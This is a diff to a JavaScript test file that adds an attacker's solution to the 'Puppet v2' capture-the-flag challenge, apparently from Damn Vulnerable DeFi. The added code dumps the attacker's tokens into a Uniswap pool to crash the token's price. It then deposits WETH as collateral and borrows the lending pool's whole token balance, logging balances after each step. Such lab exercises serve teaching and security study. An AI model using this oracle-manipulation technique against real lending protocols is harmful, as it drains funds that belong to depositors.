@@ -80,8 +80,59 @@ describe('[Challenge] Puppet v2', function () {
         ).to.be.eq(ethers.utils.parseEther('300000'));
     });
 
+    const overrides = {
+        gasLimit: 9999999
+    }
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        const showBalances = async (prefix = '') => {
+            prefix = prefix && prefix.trim() + ' ';
+            console.log(`${prefix}Balances of attacker:   `)
+            console.log(`\tETH :  `, ethers.utils.formatEther(await ethers.provider.getBalance(attacker.address)));
+            console.log(`\tDVT :  `, ethers.utils.formatEther(await this.token.balanceOf(attacker.address)));
+            console.log(`\tWETH9: `, ethers.utils.formatEther(await this.weth.balanceOf(attacker.address)));
+
+            console.log(`${prefix}Balances of uniswap:   `)
+            console.log(`\tETH:   `, ethers.utils.formatEther(await ethers.provider.getBalance(this.uniswapExchange.address)));
+            console.log(`\tDVT:   `, ethers.utils.formatEther(await this.token.balanceOf(this.uniswapExchange.address)));
+            console.log(`\tWETH9: `, ethers.utils.formatEther(await this.weth.balanceOf(this.uniswapExchange.address)));
+
+            console.log(`${prefix}Balances of lender:   `)
+            console.log(`\tETH:   `, ethers.utils.formatEther(await ethers.provider.getBalance(this.lendingPool.address)));
+            console.log(`\tDVT:   `, ethers.utils.formatEther(await this.token.balanceOf(this.lendingPool.address)));
+            console.log(`\tWETH9: `, ethers.utils.formatEther(await this.weth.balanceOf(this.lendingPool.address)));
+
+            console.log();
+        };
+
+        await showBalances('Starting');
+
+        const initialTokenBalance = await this.token.balanceOf(attacker.address);
+        const appTxn = await this.token.connect(attacker)
+            .approve(this.uniswapRouter.address, initialTokenBalance);
+        appTxn.wait();
+        console.log(`Approved ${await this.uniswapExchange.address} to spend ${ethers.utils.formatEther(initialTokenBalance)} tokens.`);
+
+        const swapTxn1 = await this.uniswapRouter.connect(attacker)
+            .swapExactTokensForETH(
+                initialTokenBalance,
+                0,
+                [this.token.address, this.uniswapRouter.WETH()],
+                attacker.address,
+                9999999999
+            );
+        swapTxn1.wait();
+        console.log(`Swapped ${ethers.utils.formatEther(initialTokenBalance)} of ${await this.token.symbol()} for ETH`);
+        await showBalances("After Swap #1");
+
+        const collateral = await this.lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);
+        console.log('Required collateral in eth:', collateral.toString());
+        await this.weth.connect(attacker).deposit({ value: collateral });
+        await showBalances("After Deposit");
+
+        await this.weth.connect(attacker).approve(this.lendingPool.address, collateral);
+        await this.lendingPool.connect(attacker).borrow(POOL_INITIAL_TOKEN_BALANCE);
+        await showBalances("After Borrow");
     });
 
     after(async function () {
